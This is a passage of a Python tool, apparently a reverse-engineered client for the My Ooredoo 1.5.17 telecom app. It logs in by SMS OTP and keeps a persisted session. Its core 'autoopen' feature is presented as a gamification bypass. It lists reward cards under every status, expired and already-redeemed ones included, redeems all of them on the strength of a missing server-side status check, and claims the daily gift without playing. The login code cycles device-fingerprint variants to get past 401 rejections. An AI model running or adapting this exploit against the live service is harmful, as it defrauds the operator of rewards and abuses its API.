def snake_list(session, args, state: dict, extra: dict[str, str],
               status: str | None = "AVAILABLE") -> list:
    """GET power-snake[?status=…] → pretty-print + cache items for 'open <n>'.
    status=None → no filter (the endpoint's full enumeration)."""
    sess = state["session"]
    path = EP_SNAKES + (f"?status={status}" if status else "")
    resp = snake_call(session, args.base_url, sess["msisdn"], sess["access_token"],
                      "GET", path, extra, state, args.timeout,
                      fp_for(state, args.fp_mode, "session"))
    try:
        body = resp.json()
    except ValueError:
        LOG.error("[!] non-JSON answer (HTTP %s) — cannot list cards.", resp.status_code)
        return []
    items = body.get("items") if isinstance(body, dict) else None
    items = items if isinstance(items, list) else []
    LOG.info("=" * 76)
    LOG.info("[SNAKE] power-snake cards (filter: %s): total=%s (items returned: %d)",
             status or "NONE", body.get("total", "?"), len(items))
    for i, it in enumerate(items, start=1):
        LOG.info("  #%d  uuid   : %s", i, it.get("uuid"))
        LOG.info("      status : %s   earned: %s   expires: %s   redeemed: %s",
                 it.get("status", "?"), it.get("earnedDate", "?"),
                 it.get("expiryDate", "?"), it.get("redeemedDate") or "-")
        LOG.info("      reward : %s", snake_reward_summary(it.get("assignedReward")))
    if not items:
        LOG.info("  (no cards under this filter — try 'autoopen' to probe EVERY status)")
    LOG.info("=" * 76)
    state["_snake_items"] = items
    return items


def snake_open_by_uuid(session, args, state: dict, extra: dict[str, str],
                       snake_uuid: str, quiet_refresh: bool = True) -> bool:
    """POST power-snake/<uuid>/redeem (EMPTY body) + app verdict (code==400=OK)."""
    if not snake_uuid:
        LOG.error("[!] no card uuid given.")
        return False
    sess = state["session"]
    resp = snake_call(session, args.base_url, sess["msisdn"], sess["access_token"],
                      "POST", f"{EP_SNAKES}/{snake_uuid}/redeem", extra, state,
                      args.timeout, fp_for(state, args.fp_mode, "session"))
    try:
        body = resp.json()
    except ValueError:
        body = {}
    if not isinstance(body, dict):
        body = {}
    code = body.get("code")
    message = body.get("message")
    # --- VERDICT: PowerSnakeCubit::unlockPowerSnake @ 0xdf3f40 ---------------
    #   cmp code, 0x190 (400) ; b.ne -> FAILED branch.  i.e. code == 400 => OK.
    if code == 400:
        reward = body.get("assignedReward")
        LOG.info("=" * 76)
        LOG.info("[+] POWER SNAKE UNLOCKED — card %s", snake_uuid)
        LOG.info("[+] reward    : %s", snake_reward_summary(reward))
        if message:
            LOG.info("[+] message   : %s", message)
        LOG.info("[i] verdict basis: body.code == 400 (PowerSnakeCubit @ 0xdf3f40)")
        LOG.info("=" * 76)
        # app behavior: Future.delayed(Duration) -> getPowerSnakes() refresh
        time.sleep(1.0)
        if quiet_refresh:
            snake_list(session, args, state, extra)
        return True
    # DioException path (RemotePowerSnakeApi @ 0xdf44b8): message from the
    # error body (Map or jsonDecode'd string) else 'Something went wrong'.
    LOG.error("[!] OPEN FAILED — HTTP %s, body.code=%r, message=%r",
              resp.status_code, code, message or "Something went wrong")
    return False


def snake_open(session, args, state: dict, extra: dict[str, str], target: str) -> bool:
    """'open <n|uuid|all>' — n = index from the last 'snakes' listing, all =
    redeem every cached card, uuid = explicit card id."""
    items = state.get("_snake_items") or []
    if target.lower() == "all":
        if not items:
            LOG.error("[!] card cache empty — run 'snakes' (or 'autoopen') first.")
            return False
        ok = 0
        for it in items:
            if snake_open_by_uuid(session, args, state, extra, it.get("uuid", "")):
                ok += 1
            time.sleep(0.7)          # be gentle with the BFF between cards
        LOG.info("[SNAKE] 'open all' finished: %d/%d cards unlocked.", ok, len(items))
        return ok > 0
    snake_uuid = target
    if target.isdigit():
        idx = int(target)
        if not (1 <= idx <= len(items)):
            LOG.error("[!] index %d out of range — run 'snakes' first (1..%d).",
                      idx, len(items))
            return False
        snake_uuid = items[idx - 1].get("uuid", "")
    if not snake_uuid:
        LOG.error("[!] no card uuid — run 'snakes' then 'open <n>' (or 'open <uuid>').")
        return False
    return snake_open_by_uuid(session, args, state, extra, snake_uuid)


# ---------------------------------------------------------------------------
# v6 — THE GAMIFICATION BYPASS
#
# "remove the gamification … it needs to open even when no cards are there":
#   * the ONLY thing standing between you and the cards is a QUERY PARAM —
#     the app asks status=AVAILABLE and only draws what comes back
#     (PowerSnakeCubit.getPowerSnakes @ 0xde9898). The server keeps every
#     card under other statuses too (REDEEMED / EXPIRED / …) and redeem
#     itself never re-checks the status.
#   * the spin-wheel / puzzle-snake / Flarie WebView games are 100% client
#     theater: 'play' is a plain GET (with the checkpoint nonce) whose
#     response already contains the granted gift.
# So: enumerate all statuses, redeem everything found, then claim the daily
# gift directly — game removed, works with zero AVAILABLE cards.
# ---------------------------------------------------------------------------
def snake_probe_all(session, args, state: dict, extra: dict[str, str]) -> dict:
    """Probe the list endpoint with EVERY status filter (plus none). Returns
    {uuid: item} — every card the account has, in ANY state."""
    sess = state["session"]
    found: dict[str, dict] = {}
    for st in (None, *SNAKE_STATUS_PROBES):
        path = EP_SNAKES + (f"?status={st}" if st else "")
        resp = snake_call(session, args.base_url, sess["msisdn"], sess["access_token"],
                          "GET", path, extra, state, args.timeout,
                          fp_for(state, args.fp_mode, "session"))
        try:
            body = resp.json()
        except ValueError:
            body = None
        items = body.get("items") if isinstance(body, dict) else None
        if not isinstance(items, list):
            LOG.debug("[probe] %-58s -> HTTP %s (no items)", path, resp.status_code)
            continue
        for it in items:
            if isinstance(it, dict) and it.get("uuid"):
                found.setdefault(it["uuid"], it)
        LOG.info("[probe] %-58s -> total=%-4s items=%d (unique so far: %d)",
                 path, str(body.get("total", "?")), len(items), len(found))
    return found


def snake_autoopen(session, args, state: dict, extra: dict[str, str]) -> None:
    """AUTO-OPEN — the full gamification bypass in one command:
       1. probe cards under EVERY status (not just AVAILABLE)
       2. POST redeem on EVERY discovered uuid (regardless of its status)
       3. claim the daily play gift DIRECTLY (no spin-wheel, no puzzle game)
       4. show gamification status + history for the final picture."""
    LOG.info("=" * 76)
    LOG.info("[SNAKE] AUTO-OPEN — gamification bypass (no game, no AVAILABLE-only gate)")
    LOG.info("=" * 76)
    cards = snake_probe_all(session, args, state, extra)
    LOG.info("=" * 76)
    LOG.info("[SNAKE] unique cards discovered under ALL statuses: %d", len(cards))
    for i, (u, it) in enumerate(cards.items(), start=1):
        LOG.info("  #%d  %s  [%s]  %s", i, u, it.get("status", "?"),
                 snake_reward_summary(it.get("assignedReward")))
    state["_snake_items"] = list(cards.values())   # cache for 'open <n>' too
    opened = 0
    if cards:
        LOG.info("-" * 76)
        LOG.info("[SNAKE] opening every card (any status) …")
        for i, (u, it) in enumerate(cards.items(), start=1):
            LOG.info("-" * 76)
            LOG.info("[SNAKE] card %d/%d  %s  (status=%s)",
                     i, len(cards), u, it.get("status", "?"))
            if snake_open_by_uuid(session, args, state, extra, u,
                                  quiet_refresh=False):
                opened += 1
            if i < len(cards):
                time.sleep(0.7)
    else:
        LOG.warning("[i] no cards exist under any status — redeeming nothing "
                    "(cards are earned server-side by bundle purchases).")
    LOG.info("=" * 76)
    LOG.info("[SNAKE] cards unlocked: %d/%d", opened, len(cards))
    LOG.info("-" * 76)
    LOG.info("[GAME] claiming the daily 'play' gift directly (wheel/puzzle SKIPPED) …")
    game_play(session, args, state, extra)
    game_status(session, args, state, extra)
    game_history(session, args, state, extra)
    LOG.info("=" * 76)
    LOG.info("[SNAKE] AUTO-OPEN complete — 'snakes' to re-list, 'open <n>' to retry.")
    LOG.info("=" * 76)


def game_status(session, args, state: dict, extra: dict[str, str]) -> None:
    """GET gamification/status → GameCubit @ 0xc4a1d0: played/lastPlayedTime."""
    sess = state["session"]
    resp = authed_call(session, args.base_url, sess["msisdn"], sess["access_token"],
                       "GET", EP_GAME_STATUS, None, extra, state, args.timeout,
                       fp_for(state, args.fp_mode, "session"))
    try:
        body = resp.json()
    except ValueError:
        return
    if isinstance(body, dict):
        LOG.info("[GAME] status: played=%s  lastPlayedTime=%s",
                 body.get("played"), body.get("lastPlayedTime", "-"))
        if body.get("played") is False:
            LOG.info("[GAME] the app would show the floating game button "
                     "(GameUIEnableState) — 'play' is available.")


def game_play(session, args, state: dict, extra: dict[str, str]) -> None:
    """GET gamification/play — LEGACY layer: checkpoint nonce pre-flight first
    (ApiCalls::playGame @ 0xe89a74: getNonceValidation(msisdn,'GET',path)).
    Grants the daily spin-wheel gift DIRECTLY — the response IS the gift
    (game_home_screen parses giftName / validityHour @ 0xe89df8-0xe89e88)."""
    sess = state["session"]
    nonce_id, chronos_id = ("", "") if args.no_nonce else get_nonce(
        session, args.base_url, sess["msisdn"], extra, state, args.timeout,
        fp_for(state, args.fp_mode, "session"), path=EP_GAME_PLAY, method="GET")
    resp = authed_call(session, args.base_url, sess["msisdn"], sess["access_token"],
                       "GET", EP_GAME_PLAY, None, extra, state, args.timeout,
                       fp_for(state, args.fp_mode, "session"),
                       nonce_id=nonce_id, chronos_id=chronos_id)
    try:
        body = resp.json()
        LOG.info("[GAME] play payload:\n%s",
                 json.dumps(body, indent=2, ensure_ascii=False))
        if isinstance(body, dict) and body.get("giftName"):
            LOG.info("[+] DAILY GIFT GRANTED: %s (validity %s h)",
                     body.get("giftName"), body.get("validityHour", "?"))
    except ValueError:
        pass


def game_history(session, args, state: dict, extra: dict[str, str]) -> None:
    """GET gamification/history (ApiCalls::getGameHistories @ 0xd03e70)."""
    sess = state["session"]
    authed_call(session, args.base_url, sess["msisdn"], sess["access_token"],
                "GET", EP_GAME_HISTORY, None, extra, state, args.timeout,
                fp_for(state, args.fp_mode, "session"))


# ---------------------------------------------------------------------------
# Verdict + token persistence
# ---------------------------------------------------------------------------
def tokens_from_response(resp: requests.Response) -> dict | None:
    """App criterion (cubit closure @ 0xe3d730): 2xx AND access_token is String."""
    try:
        body = resp.json()
    except ValueError:
        body = {}
    access = body.get("access_token")
    if 200 <= resp.status_code < 300 and isinstance(access, str) and access:
        return body
    return None


def announce_success(tokens: dict, password_param_used: bool) -> None:
    LOG.info("=" * 76)
    LOG.info("[+] ==============================")
    LOG.info("[+]     LOGGED IN SUCCESSFULLY    ")
    LOG.info("[+] ==============================")
    LOG.info("[i] verdict basis : 2xx + access_token (OnboardingMobileMainCubit @ 0xe3d730)")
    if password_param_used:
        LOG.warning("[i] NOTE: success came via the fallback 'password' param.")
    LOG.info("[+] token_type    : %s", tokens.get("token_type", "(absent)"))
    LOG.info("[+] expires_in    : %s s", tokens.get("expires_in", "(absent)"))
    LOG.info("[+] scope         : %s", tokens.get("scope", "(absent)"))
    at = tokens.get("access_token", "")
    LOG.info("[+] access_token  : %s", at[:38] + "…")
    rt = tokens.get("refresh_token", "")
    LOG.info("[+] refresh_token : %s", rt[:38] + "…")
    payload = decode_jwt_payload(at)
    if payload:
        LOG.info("[+] access_token JWT payload (decoded):")
        LOG.info("%s", json.dumps(payload, indent=2, ensure_ascii=False))
        exp = payload.get("exp")
        if isinstance(exp, (int, float)):
            remain = int(exp - time.time())
            LOG.info("[+] session validity: expires in %d min %d s", remain // 60, remain % 60)
    LOG.info("=" * 76)


def announce_failure(resp: requests.Response) -> None:
    LOG.error("[!] LOGIN FAILED — HTTP %s (%s).",
              resp.status_code,
              {401: "Keycloak: invalid credentials / wrong OTP",
               403: "empty-body rejection signal",
               400: "malformed grant"}.get(resp.status_code,
                                          "server error" if resp.status_code >= 500 else "rejected"))


def save_tokens(path: str, msisdn: str, tokens: dict) -> None:
    doc = {
        "msisdn": msisdn,
        "captured_at": datetime.now().isoformat(timespec="seconds"),
        "app": "My Ooredoo 1.5.17 (reconstructed loginWithOTP flow)",
        "tokens": tokens,
    }
    try:
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(doc, fh, indent=2, ensure_ascii=False)
        LOG.info("[+] token set saved to: %s", os.path.abspath(path))
    except Exception as exc:
        LOG.warning("[!] could not save tokens (%s)", exc)


# ---------------------------------------------------------------------------
# Interactive OTP input with resend support
# ---------------------------------------------------------------------------
def prompt_otp() -> str | None:
    while True:
        try:
            raw = input("[?] Enter the OTP code from the LATEST SMS "
                        "('r' = resend, Enter = abort): ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return None
        if raw == "":
            return None
        if raw.lower() == "r":
            return "RESEND"
        code = "".join(c for c in raw if c.isdigit())
        if 3 <= len(code) <= 10:
            return code
        LOG.warning("[!] '%s' doesn't look like an OTP code (3-10 digits). Try again.", raw)


# ---------------------------------------------------------------------------
# The login flow (dispatch -> wait -> verify-retry-loop) -> tokens or None
# ---------------------------------------------------------------------------
def run_login_flow(args, state: dict, extra: dict[str, str],
                   session: requests.Session) -> dict | None:
    norm = state.get("_login_msisdn", "")

    # --- STEP 1 + 2: nonce then OTP dispatch -----------------------------
    # (dispatch-phase fingerprint is "" in auto mode — field-verified working)
    def dispatch(resend: bool) -> None:
        if args.no_nonce:
            nonce_id, chronos_id = "", ""
        else:
            try:
                nonce_id, chronos_id = get_nonce(
                    session, args.base_url, norm, extra, state, args.timeout,
                    fp_for(state, args.fp_mode, "dispatch"))
            except SystemExit:
                raise
            except Exception as exc:
                LOG.warning("[!] checkpoint pre-flight failed (%s) — continuing", exc)
                nonce_id, chronos_id = "", ""
        request_otp(session, args.base_url, norm, nonce_id, chronos_id,
                    resend, extra, state, args.timeout,
                    fp_for(state, args.fp_mode, "dispatch"))

    dispatch(False)
    resends_left = 5

    # --- WAIT: interactive code entry --------------------------------------
    if args.otp:
        otp_code = "".join(c for c in args.otp if c.isdigit())
        if not (3 <= len(otp_code) <= 10):
            LOG.error("[!] --otp must be 3-10 digits — aborting.")
            return None
    else:
        otp_code = prompt_otp()
        while otp_code == "RESEND":
            if resends_left > 0:
                resends_left -= 1
                dispatch(True)
            else:
                LOG.error("[!] resend limit reached — type the code you have or abort.")
            otp_code = prompt_otp()
        if otp_code is None:
            LOG.info("[!] aborted by user before OTP entry.")
            return None

    # --- STEP 3 + 4: verify with retry loop ---------------------------------
    # v6: a 401 rotate through the fingerprint/profile candidates (fp-order +
    # platform-info encoding) with the SAME OTP — the STEP-4 401 has never
    # been explained and the fp concatenation order / X-Platform-Info b64
    # encoding are the two prime wire suspects. The winner is remembered.
    attempts = 0
    while True:
        attempts += 1
        candidates = fp_candidates(args, state)
        for cand in candidates:
            apply_fp_profile(cand)
            if args.no_nonce:
                nonce_id, chronos_id = "", ""
            else:
                LOG.info("[STEP 3] fresh checkpoint nonce for the verification grant "
                         "(fp-order=%s, platform-info=%s)", FP_PROFILE["fp_order"],
                         "plain-JSON" if FP_PROFILE["plain_platform_info"] else "base64")
                nonce_id, chronos_id = fresh_nonce_or_empty(session, args, state, extra)
            resp_login = login_with_otp(
                session, args.base_url, norm, otp_code, nonce_id, chronos_id,
                extra, state, args.timeout,
                fp_for(state, args.fp_mode, "verify"), args.password_param)
            tokens = tokens_from_response(resp_login)
            if tokens:
                state["fp_profile"] = dict(FP_PROFILE)   # remember the winner
                LOG.info("[+] fp profile accepted: order=%s plain=%s",
                         FP_PROFILE["fp_order"], FP_PROFILE["plain_platform_info"])
                announce_success(tokens, args.password_param)
                state["session"] = session_from_tokens(norm, tokens)
                save_tokens(f"ooredoo_tokens_{norm}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                           norm, tokens)
                return tokens
            announce_failure(resp_login)
            if resp_login.status_code == 401 and cand is not candidates[-1]:
                LOG.warning("[i] 401 with fp-order=%s/%s — rotating the next "
                            "device-fingerprint variant …",
                            cand[0], "plain" if cand[1] else "b64")
                continue
            break   # non-401 (or last candidate) → fall back to the prompt loop
        if args.otp:  # non-interactive: no retry loop
            return None
        otp_code = prompt_otp()
        while otp_code == "RESEND":
            if resends_left > 0:
                resends_left -= 1
                dispatch(True)
            else:
                LOG.error("[!] resend limit reached — type the code you have or abort.")
            otp_code = prompt_otp()
        if otp_code is None:
            LOG.info("[!] no successful login — session not established.")
            return None


def fresh_nonce_or_empty(session, args, state, extra):
    try:
        return get_nonce(session, args.base_url,
                         state.get("_login_msisdn", ""), extra, state,
                         args.timeout, fp_for(state, args.fp_mode, "verify"))
    except SystemExit:
        raise
    except Exception as exc:
        LOG.warning("[!] checkpoint pre-flight failed (%s) — continuing with empty nonce", exc)
        return "", ""


# ---------------------------------------------------------------------------
# Session shell — preserves the logged-in state for the whole session
# ---------------------------------------------------------------------------
SHELL_HELP = """
  status                       msisdn, token expiry, device ids
  ping                         POST /api/ooredoo-bff/users/authping (session proof)

  POWER OF SNAKE (gamification — features/power_snake module):
  autoopen                    THE BYPASS: probe cards under EVERY status, redeem
                              them ALL (any status), then claim the daily 'play'
                              gift DIRECTLY (no game) + show status/history.
                              Works even when the app shows no AVAILABLE cards.
                              (aliases: harvest, snake)
  snakes [STATUS|all]         list cards (default AVAILABLE — e.g.
                              'snakes REDEEMED', 'snakes all' = no filter)
  open <n|uuid|all>           redeem card(s): POST …/power-snake/<uuid>/redeem
                              (<n> = the # shown by 'snakes'; app verdict:
                              body.code == 400 => UNLOCKED + reward)
  game                         gamification/status  {played, lastPlayedTime}
  ghistory                     gamification/history (previous rewards)
  play                         gamification/play  (daily gift — nonce pre-flight)

  call METHOD PATH [JSON]      authenticated call, e.g.
                                 call POST /api/ooredoo-bff/users/detect {"msisdn":"213..."}
  get PATH                     shorthand for call GET PATH
  post PATH [JSON]             shorthand for call POST PATH [JSON]
  refresh                      grant_type=refresh_token — rotate the tokens
  resend                       dispatch a NEW SMS OTP (login again afterwards)
  relog                        full OTP login flow (replaces current session)
  logout                       Keycloak logout + clear persisted session
  tokens                       print current tokens (full)
  help                         this text
  exit                         persist session and quit
""".strip()


def ensure_live_token(session, args, state, extra) -> bool:
    """Auto-refresh if the access token expired. Returns True if usable."""
    sess = state.get("session") or {}
    at, rt = sess.get("access_token", ""), sess.get("refresh_token", "")
    left = token_seconds_left(at, sess.get("expires_at"))
    if at and (left is None or left > 5):
        return True
    if not rt:
        return False
    LOG.warning("[i] access token expired — auto-refreshing via grant_type=refresh_token …")
    nonce_id, chronos_id = ("", "") if args.no_nonce else fresh_nonce_or_empty(
        session, args, state, extra)
    resp = refresh_grant(session, args.base_url, sess["msisdn"], rt,
                         nonce_id, chronos_id, extra, state, args.timeout,
                         fp_for(state, args.fp_mode, "session"))
    tokens = tokens_from_response(resp)
    if not tokens:
        LOG.error("[!] refresh failed (HTTP %s) — session expired; use 'relog'.", resp.status_code)
        return False
    state["session"] = session_from_tokens(sess["msisdn"], tokens)
    save_state(args.state_file, state)
    LOG.info("[+] tokens refreshed — new access_token: %s…", tokens["access_token"][:38])
    return True


def maybe_autoopen(session, args, state, extra) -> None:
    """--autoopen hook: run the Power-of-Snake gamification bypass once."""
    if not getattr(args, "autoopen", False):
        return
    LOG.info("[i] --autoopen: running the Power-of-Snake gamification bypass …")
    if ensure_live_token(session, args, state, extra):
        snake_autoopen(session, args, state, extra)
    else:
        LOG.error("[!] session not usable — autoopen skipped ('relog' to log in).")


def session_shell(args, state: dict, extra: dict[str, str],
                  session: requests.Session) -> None:
    sess = state.get("session") or {}
    msisdn = sess.get("msisdn", "?")
    LOG.info("=" * 76)
    LOG.info("[i] SESSION ACTIVE — logged in as %s", msisdn)
    LOG.info("[i] state file   : %s (tokens persisted — rerun to resume)", os.path.abspath(args.state_file))
    LOG.info("[i] type 'help' for session commands, 'exit' to quit")
    LOG.info("=" * 76)
    while True:
        try:
            line = input(f"[ooredoo:{msisdn}] > ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            line = "exit"
        if not line:
            continue
        parts = line.split()
        cmd = parts[0].lower()
        try:
            if cmd in ("exit", "quit"):
                save_state(args.state_file, state)
                LOG.info("[i] session preserved in %s — bye.", os.path.abspath(args.state_file))
                return
            elif cmd == "help":
                print(SHELL_HELP)
            elif cmd == "status":
                sess = state.get("session") or {}
                at = sess.get("access_token", "")
                left = token_seconds_left(at, sess.get("expires_at"))
                rt_left = token_seconds_left(sess.get("refresh_token", ""),
                                             sess.get("refresh_expires_at"))
                LOG.info("msisdn           : %s", sess.get("msisdn"))
                LOG.info("logged in since  : %s", sess.get("captured_at"))
                LOG.info("access_token     : %s (%s)", at[:38] + "…",
                         f"{int(left)}s left" if left is not None else "no exp claim")
                LOG.info("refresh_token    : %s (%s)", (sess.get("refresh_token", "") or "")[:38] + "…",
                         f"{int(rt_left)}s left" if rt_left is not None else "-")
                LOG.info("instance-id      : %s", state["uuid"])
                LOG.info("device-id        : %s", state["device_id"])
            elif cmd == "tokens":
                print(json.dumps(state.get("session") or {}, indent=2))
            elif cmd == "ping":
                if ensure_live_token(session, args, state, extra):
                    authed_call(session, args.base_url, msisdn,
                                state["session"]["access_token"],
                                "POST", EP_AUTHPING, {}, extra, state, args.timeout,
                                fp_for(state, args.fp_mode, "session"))
            elif cmd in ("autoopen", "harvest", "snake"):
                if ensure_live_token(session, args, state, extra):
                    snake_autoopen(session, args, state, extra)
            elif cmd == "snakes":
                if ensure_live_token(session, args, state, extra):
                    st = parts[1] if len(parts) > 1 else "AVAILABLE"
                    snake_list(session, args, state, extra,
                               None if st.lower() == "all" else st)
            elif cmd == "open" and len(parts) >= 2:
                if ensure_live_token(session, args, state, extra):
                    snake_open(session, args, state, extra, parts[1])
            elif cmd == "game":
                if ensure_live_token(session, args, state, extra):
                    game_status(session, args, state, extra)
            elif cmd == "ghistory":
                if ensure_live_token(session, args, state, extra):
                    game_history(session, args, state, extra)
            elif cmd == "play":
                if ensure_live_token(session, args, state, extra):
                    game_play(session, args, state, extra)
            elif cmd == "get" and len(parts) >= 2:
                if ensure_live_token(session, args, state, extra):
                    authed_call(session, args.base_url, msisdn,
                                state["session"]["access_token"],
                                "GET", parts[1], None, extra, state, args.timeout,
                                fp_for(state, args.fp_mode, "session"))
            elif cmd == "post" and len(parts) >= 2:
                body = json.loads(" ".join(parts[2:])) if len(parts) > 2 else {}
                if ensure_live_token(session, args, state, extra):
                    authed_call(session, args.base_url, msisdn,
                                state["session"]["access_token"],
                                "POST", parts[1], body, extra, state, args.timeout,
                                fp_for(state, args.fp_mode, "session"))
            elif cmd == "call" and len(parts) >= 3:
                body = json.loads(" ".join(parts[3:])) if len(parts) > 3 else None
                if ensure_live_token(session, args, state, extra):
                    authed_call(session, args.base_url, msisdn,
                                state["session"]["access_token"],
                                parts[1], parts[2], body, extra, state, args.timeout,
                                fp_for(state, args.fp_mode, "session"))
            elif cmd == "refresh":
                state["session"] = state.get("session") or {}
                if not ensure_live_token(session, args, state, extra):
                    LOG.warning("[i] tip: 'relog' to start a fresh OTP login.")
                else:
                    LOG.info("[i] tokens are live (auto-refresh already applied if needed).")
            elif cmd == "resend":
                state["_login_msisdn"] = (state.get("session") or {}).get("msisdn", msisdn)
                nonce_id, chronos_id = ("", "") if args.no_nonce else fresh_nonce_or_empty(
                    session, args, state, extra)
                request_otp(session, args.base_url, state["_login_msisdn"],
                            nonce_id, chronos_id, True, extra, state, args.timeout,
                            fp_for(state, args.fp_mode, "dispatch"))
                LOG.warning("[*] new OTP dispatched — use 'relog' and type the fresh code.")
            elif cmd == "relog":
                state["_login_msisdn"] = input("[?] phone number (Enter = same): ").strip() \
                    or (state.get("session") or {}).get("msisdn", "")
                state["_login_msisdn"] = normalize_msisdn(state["_login_msisdn"])
                tokens = run_login_flow(args, state, extra, session)
                if tokens:
                    save_state(args.state_file, state)
                    sess = state.get("session") or {}
                    msisdn = sess.get("msisdn", msisdn)
            elif cmd == "logout":
                sess = state.get("session") or {}
                keycloak_logout(session, args.base_url, msisdn,
                                sess.get("refresh_token", ""), sess.get("access_token", ""),
                                extra, state, args.timeout,
                                fp_for(state, args.fp_mode, "session"))
                state["session"] = None
                save_state(args.state_file, state)
                LOG.info("[i] session cleared (local + Keycloak notified). 'relog' to log in again, 'exit' to quit.")
            else:
                print(f"[?] unknown command '{cmd}' — try 'help'")
        except SystemExit:
            raise
        except Exception as exc:
            LOG.error("[!] command failed: %s", exc)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main() -> None:
    p = argparse.ArgumentParser(
        description="My Ooredoo 1.5.17 — OTP login + SESSION + POWER-OF-SNAKE client: "
                    "send SMS OTP, verify, KEEP the logged-in state (persisted + "
                    "resumable), then list/open gamification cards and run the "
                    "'autoopen' gamification bypass (probe every card status, redeem "
                    "all, claim the daily play gift with NO game) — the app's exact "
                    "wire protocol (v6).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("msisdn", nargs="?", help="MSISDN to log in with. Local/international "
                   "forms accepted. Prompted if omitted and no saved session exists.")
    p.add_argument("--otp", help="non-interactive: the SMS OTP code to verify "
                   "(no retry loop, no session shell on success)")
    p.add_argument("--resend", action="store_true",
                   help="mark the initial OTP request as a re-send (resend=true)")
    p.add_argument("--password-param", action="store_true",
                   help="verify with password=<CODE> instead of the AOT-confirmed otp=<CODE>")
    p.add_argument("--fp-mode", choices=["auto", "empty", "msisdn"], default="auto",
                   help="X-Device-Fingerprint stored-msisdn binding: auto = '' on dispatch "
                        "(field-verified) + MSISDN on verify/session (app behavior — v3's "
                        "401 fix); empty = v3 legacy; msisdn = everywhere")
    p.add_argument("--fp-order", choices=[*FP_ORDERS, "auto"], default="auto",
                   help="v6: X-Device-Fingerprint HMAC message concatenation order "
                        "(AOT reading = ts-uuid-msisdn). 'auto' = rotate all 6 orders x "
                        "2 platform-info encodings on a 401 verify (same OTP) and "
                        "remember the winner in the state file")
    p.add_argument("--plain-platform-info", action="store_true",
                   help="v6 A/B fallback: legacy v4 raw-JSON X-Platform-Info + hex "
                        "device-id (default: app-faithful base64(utf8(json)) + "
                        "X-Platform-Data-Signature)")
    p.add_argument("--autoopen", action="store_true",
                   help="after login/session-resume: run the Power-of-Snake bypass once "
                        "(probe every card status, redeem all, claim the daily play gift)")
    p.add_argument("--fresh", action="store_true",
                   help="ignore any saved session and perform a new OTP login")
    p.add_argument("--logout", action="store_true",
                   help="one-shot: log out the saved session (Keycloak + clear state) and exit")
    p.add_argument("--base-url", default=BASE_URL, help="API base URL (lab/mock override)")
    p.add_argument("--proxy", help="HTTP(S) proxy, e.g. http://127.0.0.1:8080 (Burp)")
    p.add_argument("--extra-header", action="append", metavar="K:V",
                   help="additional header, repeatable — overrides synthesized ones")
    p.add_argument("--no-nonce", action="store_true", help="skip checkpoint pre-flights")
    p.add_argument("--timeout", type=float, default=15.0, help="per-request timeout (s)")
    p.add_argument("--insecure", action="store_true", help="do not verify TLS (Burp)")
    p.add_argument("--state-file", default=".ooredoo_device_state.json",
                   help="device + SESSION state persistence")
    p.add_argument("--x-sig-raw", action="store_true",
                   help="use the no-newline x-signature variant")
    p.add_argument("--logfile", help="custom log file path")
    p.add_argument("-v", "--verbose", action="store_true", help="debug output on console")
    args = p.parse_args()

    global X_SIGNATURE
    if args.x_sig_raw:
        X_SIGNATURE = X_SIGNATURE_RAW

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    setup_logging(args.logfile or f"ooredoo_login_{stamp}.log", args.verbose)

    state = load_state(args.state_file)
    # v6 fingerprint profile precedence: explicit --fp-order > saved winner > AOT default
    saved_fp = state.get("fp_profile") or {}
    if args.fp_order != "auto":
        FP_PROFILE.update(fp_order=args.fp_order,
                          plain_platform_info=args.plain_platform_info)
    elif saved_fp.get("fp_order"):
        FP_PROFILE.update(fp_order=saved_fp["fp_order"],
                          plain_platform_info=bool(saved_fp.get("plain_platform_info")))
        LOG.info("[i] using saved fp profile: order=%s plain=%s",
                 FP_PROFILE["fp_order"], FP_PROFILE["plain_platform_info"])
    else:
        FP_PROFILE.update(fp_order=FP_ORDERS[0],
                          plain_platform_info=args.plain_platform_info)
    banner()
    LOG.info("Base URL     : %s", args.base_url)
    LOG.info("x-signature  : %s%s", X_SIGNATURE[:16] + "…", " (raw variant)" if args.x_sig_raw else "")
    LOG.info("fp-mode      : %s   fp-order: %s   platform-info: %s",
             args.fp_mode, FP_PROFILE["fp_order"],
             "plain-JSON" if FP_PROFILE["plain_platform_info"] else "base64")
    LOG.info("Pseudo-device: instance-id=%s  device-id=%s  (state: %s)",
             state["uuid"], state["device_id"], os.path.abspath(args.state_file))
    if args.proxy:
        LOG.info("Proxy        : %s", args.proxy)
    if args.insecure:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        LOG.warning("TLS verification DISABLED (interception mode)")

    extra = parse_extra_headers(args.extra_header)
    if extra:
        LOG.info("Extra headers: %s", extra)

    session = requests.Session()
    session.proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    session.verify = not args.insecure

    # ---------------- one-shot logout ---------------------------------------
    if args.logout:
        sess = state.get("session")
        if not sess:
            LOG.info("[i] no saved session to log out.")
            return
        keycloak_logout(session, args.base_url, sess.get("msisdn", ""),
                        sess.get("refresh_token", ""), sess.get("access_token", ""),
                        extra, state, args.timeout,
                        fp_for(state, args.fp_mode, "session"))
        state["session"] = None
        save_state(args.state_file, state)
        LOG.info("[i] saved session cleared.")
        return

    # ---------------- resume saved session ------------------------------------
    sess = state.get("session")
    if sess and not args.fresh:
        left = token_seconds_left(sess.get("access_token", ""), sess.get("expires_at"))
        LOG.info("[i] saved session found for %s (captured %s)",
                 sess.get("msisdn"), sess.get("captured_at"))
        if left is not None and left > 5:
            LOG.info("[+] access token still valid (%d min left) — RESUMING SESSION.",
                     int(left // 60))
            if args.otp:
                LOG.info("[i] --otp ignored: session already valid.")
            state["_login_msisdn"] = sess.get("msisdn", "")
            maybe_autoopen(session, args, state, extra)
            session_shell(args, state, extra, session)
            return
        LOG.info("[i] access token expired — trying refresh_token grant …")
        ok = ensure_live_token(session, args, state, extra)
        if ok:
            LOG.info("[+] SESSION RESUMED via refresh token.")
            state["_login_msisdn"] = state["session"]["msisdn"]
            maybe_autoopen(session, args, state, extra)
            session_shell(args, state, extra, session)
            return
        LOG.warning("[!] session expired — falling back to a fresh OTP login.")
        state["session"] = None
        save_state(args.state_file, state)

